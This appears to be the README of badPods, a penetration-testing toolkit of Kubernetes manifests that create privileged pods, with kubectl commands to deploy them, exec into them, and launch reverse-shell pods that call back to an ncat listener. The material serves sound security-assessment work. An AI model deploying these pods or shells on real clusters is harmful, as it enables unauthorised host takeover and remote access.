# badPods

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like `hostNetwork`, `hostPID`, `hostPath`, `hostIPC`, and `privileged`. 

**Blog post placeholder**

## Contents

* [Quick Start](#quick-start)
* [The badPods line-up](#The-badPods-line-up)
* [Prerequisites](#Prerequisites)
* [Organization](#Organization)
* [Usage](#Usage)
   * [High level approach](#High-level-approach)
   * [Usage examples](#Usage-examples)
* [Acknowledgements](#Acknowledgements)
* [References and further reading](#References-and-further-reading)

## Quick Start
1. Create a pod, find the pod, exec into pod:  
   ```
   kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/[BAD_POD_TYPE]/[RESOURCE_TYPE]/[FILENAME].yaml 
   kubectl get pods | grep nothing-allowed-exec-[RESOURCE_TYPE]      
   kubectl exec -it [BAD_POD_TYPE]-exec-[RESOURCE_TYPE]-[ID] -- bash
   ```
1. Navigate to the Bad Pod README below which provides detailed usage information and post exploitation recommendations

   * [Bad Pod #1: Everything allowed](manifests/everything-allowed/) 
   * [Bad Pod #2: Privileged and hostPid](manifests/priv-and-hostpid/) 
   * [Bad Pod #3: Privileged only](manifests/priv/) 
   * [Bad Pod #4: hostPath only](manifests/hostpath/) 
   * [Bad Pod #5: hostPid only](manifests/hostpid/) 
   * [Bad Pod #6: hostNetwork only](manifests/hostnetwork/) 
   * [Bad Pod #7: hostIPC only](manifests/hostipc/) 
   * [Bad Pod #8: Nothing allowed](manifests/nothing-allowed/) 
     
# Prerequisites
1. Access to a cluster 
1. RBAC permission to create one of the following resource types in at least one namespace: 
   * CronJob, DeamonSet, Deployment, Job, Pod, ReplicaSet, ReplicationController, StatefulSet
1. RBAC permission to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
1. No pod security policy enforcement, or a policy that allows pods to be created with one or more security sensitive attributes


  
# Organization
* 128 self-contained, ready to use manifests. Why so many?
   * 8 badPods (hostpid, hostnetwork, everything-allowed, etc.)
   * 8 resource types that can create pods (pod, deployment, replicaset, statefulset, etc.)
   * 2 ways to access the created pods (exec & reverse shell)

```
├── manifests
│   ├── everything-allowed
│   │   ├── cronjob
│   │   │   ├── everything-allowed-exec-cronjob.yaml
│   │   │   └── everything-allowed-revshell-cronjob.yaml
│   │   ├── daemonset
│   │   │   ├── everything-allowed-exec-daemonset.yaml
│   │   │   └── everything-allowed-revshell-daemonset.yaml
│   │   ├── deployment
│   │   │   ├── everything-allowed-exec-deployment.yaml
│   │   │   └── everything-allowed-revshell-deployment.yaml
│   │   ├── job
│   │   │   ├── everything-allowed-exec-job.yaml
│   │   │   └── everything-allowed-revshell-job.yaml
│   │   ├── pod
│   │   │   ├── everything-allowed-exec-pod.yaml
│   │   │   └── everything-allowed-revshell-pod.yaml
│   │   ├── replicaset
│   │   │   ├── everything-allowed-exec-replicaset.yaml
│   │   │   └── everything-allowed-revshell-replicaset.yaml
│   │   ├── replicationcontroller
│   │   │   ├── everything-allowed-exec-replicationcontroller.yaml
│   │   │   └── everything-allowed-revshell-replicationcontroller.yaml
│   │   └── statefulset
│   │       ├── everything-allowed-exec-statefulset.yaml
│   │       └── everything-allowed-revshell-statefulset.yaml
│   ├── hostipc
│   │   ├── cronjob
│   │   │   ├── hostipc-exec-cronjob.yaml
│   │   │   └── hostipc-revshell-cronjob.yaml
│   │   ├── daemonset
│   │   │   ├── hostipc-exec-daemonset.yaml
│   │   │   └── hostipc-revshell-daemonset.yaml
...omitted for brevity...
```

### There are eight ways to create a pod
As [Eviatar Gerzi (@g3rzi)](https://twitter.com/g3rzi) points out in the post [Eight Ways to Create a Pod](https://www.cyberark.com/resources/threat-research-blog/eight-ways-to-create-a-pod), there are 8 different controllers that can create a pod, or a set of pods.  You might not be authorized to create pods, but maybe you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 

But wait, it gets worse! In addition to the eight current Kubernetes controllers that can create pods, there are third party controllers that can also create pods if they are applied to the cluster. Keep an eye out for them by looking at `kubectl api-resources`. 

### Reverse shells
While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that uses [Rory McCune's (@raesene)](https://twitter.com/raesene) ncat dockerhub image. When created, the pod will make an encrypted call back to your listener. 

# Usage
Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. 

## High level approach

#### Option 1: Methodical approach
1. **Evaluate RBAC** - Determine which resource types you can create 
1. **Evaluate Admission Policy** - Determine which of the badPods you will be able to create
1. **Create Resources** - Based on what is allowed, use the specific badPod type and resource type and create your resources
1. **Post Exploitation** - Evaluate post exploitation steps outlined in the README for that type
   * [Everything allowed](manifests/everything-allowed/) 
   * [Privileged and hostPid](manifests/priv-and-hostpid/)
   * [Privileged only](manifests/priv/)
   * [hostPath only](manifests/hostpath/)
   * [hostPid only](manifests/hostpid/)
   * [hostNetwork only](manifests/hostnetwork/)
   * [hostIPC only](manifests/hostipc/)
   * [Nothing allowed](manifests/nothing-allowed/)


#### Option 2: Shotgun approach
1. **Create Resources** - Just start applying different manifests and see what works
   * [Create all eight badPods from Github](#Create-all-eight-badPods-from-Github)
   * [Create all eight resource types using the everything-allowed pod](#create-all-eight-resource-types-using-the-everything-allowed-pod)
1. **Post Exploitation** - For any created pods, evaluate post exploitation steps outlined in the README for that type
   * [Everything allowed](manifests/everything-allowed/) 
   * [Privileged and hostPid](manifests/priv-and-hostpid/)
   * [Privileged only](manifests/priv/)
   * [hostPath only](manifests/hostpath/)
   * [hostPid only](manifests/hostpid/)
   * [hostNetwork only](manifests/hostnetwork/)
   * [hostIPC only](manifests/hostipc/)
   * [Nothing allowed](manifests/nothing-allowed/)

## Usage Examples

* [Create all eight badPods from cloned local repo](#Create-all-eight-badPods-from-cloned-local-repo)
* [Create all eight badPods from github](#Create-all-eight-badPods-from-Github)
* [Create all eight revsere shell badPods](#Create-all-eight-revsere-shell-badPods)
* [Create all eight resource types using the everything-allowed pod](#Create-all-eight-resource-types-using-the-everything-allowed-pod)
* [Create a cronjob with the hostNetwork pod](#Create-a-cronjob-with-the-hostNetwork-pod)
* [Create a deployment with the priv-and-hostpid pod](#Create-a-deployment-with-the-priv-and-hostpid-pod)
* [Create a reverse shell using the privileged pod](#Create-a-reverse-shell-using-the-privileged-pod)


### Create all eight badPods from cloned local repo
```
kubectl apply -f ./manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl apply -f ./manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
kubectl apply -f ./manifests/priv/pod/priv-exec-pod.yaml
kubectl apply -f ./manifests/hostpath/pod/hostpath-exec-pod.yaml
kubectl apply -f ./manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl apply -f ./manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
kubectl apply -f ./manifests/hostipc/pod/hostipc-exec-pod.yaml
kubectl apply -f ./manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
```

### Create all eight badPods from Github
```
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-exec-pod-allowed.yaml 
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
```

### Create all eight revsere shell badPods
To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```
HOST="10.0.0.1" PORT="3111" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./manifests/priv-and-hostpid/pod/priv-and-hostpid-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./manifests/priv/pod/priv-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./manifests/hostpath/pod/hostpath-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./manifests/hostpid/pod/hostpid-revshell-pod.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-revshell-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshellv-pod.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
```
### Create a cronjob with the hostNetwork pod
```
kubectl apply -f manifests/hostnetwork/cronjob/hostnetwork-exec-cronjob.yaml
```

Find the created pod
```
kubectl get pods | grep cronjob
 
NAME                                        READY   STATUS    RESTARTS   AGE
hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
```

Exec into pod
```
kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
```

### Create a deployment with the priv-and-hostpid pod
```
kubectl apply -f manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml
```
Find the created pod
```
kubectl get pods | grep deployment

priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
```
Exec into pod
```
kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
```

### Create all eight resource types using the everything-allowed pod
```
find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl apply -f {} \;

cronjob.batch/everything-allowed-exec-cronjob created
daemonset.apps/everything-allowed-exec-daemonset created
deployment.apps/everything-allowed-exec-deployment created
job.batch/everything-allowed-exec-job created
pod/everything-allowed-exec-pod created
replicaset.apps/everything-allowed-exec-replicaset created
replicationcontroller/everything-allowed-exec-replicationcontroller created
service/everything-allowed-exec-statefulset-service created
statefulset.apps/everything-allowed-exec-statefulset created
```

View all of the created pods
```
kubectl get pods

NAME                                                  READY   STATUS    RESTARTS   AGE
everything-allowed-exec-daemonset-qbrdb               1/1     Running   0          52s
everything-allowed-exec-deployment-6cd7685786-rp65h   1/1     Running   0          51s
everything-allowed-exec-deployment-6cd7685786-m66bl   1/1     Running   0          51s
everything-allowed-exec-job-fhsbt                     1/1     Running   0          50s
everything-allowed-exec-pod                           1/1     Running   0          50s
everything-allowed-exec-replicaset-tlp8v              1/1     Running   0          49s
everything-allowed-exec-replicaset-6znbz              1/1     Running   0          49s
everything-allowed-exec-replicationcontroller-z9k8n   1/1     Running   0          48s
everything-allowed-exec-replicationcontroller-m4648   1/1     Running   0          48s
everything-allowed-exec-statefulset-0                 1/1     Running   0          47s
everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
```
Delete all everything-allowed resources
```
find manifests/everything-allowed/ -name \*-exec-*.yaml -exec kubectl delete -f {} \;
```

### Create a reverse shell using the privileged pod
Set up listener
```
ncat --ssl -vlp 3116
```

Create pod from local yaml without modifying it by using env variables and envsubst
```
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
```
Catch the shell 
```
ncat --ssl -vlp 3116
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116

Connection received on 10.0.0.162 42035
```

# Contributing
Pull requests and issues welcome.

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), [Mark Manning](https://twitter.com/antitree), [Eviatar Gerzi](https://twitter.com/g3rzi), and [Madhu Akula](https://twitter.com/madhuakula) for publicly sharing so much knowledge about Kubernetes offensive security. 

# References and further reading
Each Bad Pod has it's own references and further reading section, but here are some more general resources that will help you ramp up your Kubernetes security assessments and penetration tests skills.

## New kids on the block - 2020
* [Container Security Site](https://www.container-security.site/) by @raesene
* [CloudSecDocs - Container Security](https://cloudsecdocs.com/container_security/offensive/attacks/compromised_container/) by @lancinimarco
* [Risk8s Business: Risk Analysis of Kubernetes Clusters](https://tldrsec.com/guides/kubernetes/) by @antitree
* Compromising Kubernetes Cluster by Exploiting RBAC Permissions by @g3rzi - [Talk](https://www.youtube.com/watch?v=1LMo0CftVC4) / [Slides](https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf)
* Command and KubeCTL: Real-World Kubernetes Security for Pentesters by @antitree - [Talk](https://www.youtube.com/watch?v=cRbHILH4f0A) / [Blog](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)
* Kubernetes Goat by @madhuakula - [Repo](https://github.com/madhuakula/kubernetes-goat) / [Guide](https://madhuakula.com/kubernetes-goat/)

## The classics, way back from 2019
* [Secure Kubernetes - KubeCon NA 2019 CTF](https://securekubernetes.com/) by @tabbysable, @petermbenjamin, @jimmesta, and @BradGeesaman
* [The Most Pointless Kubernetes Command Ever](https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/) by @raesene 
* The Path Less Traveled: Abusing Kubernetes Defaults by @IanColdwater and @mauilion- [Talk](https://www.youtube.com/watch?v=HmoVSmTIOxM) / [Repository](https://github.com/mauilion/blackhat-2019)
* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) by @disconnect3d_pl
* [A Compendium of Container Escapes](https://www.youtube.com/watch?v=BQlqita2D2s) by @drraid and @0x7674
* [Attacking Kubernetes through Kubelet](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/)

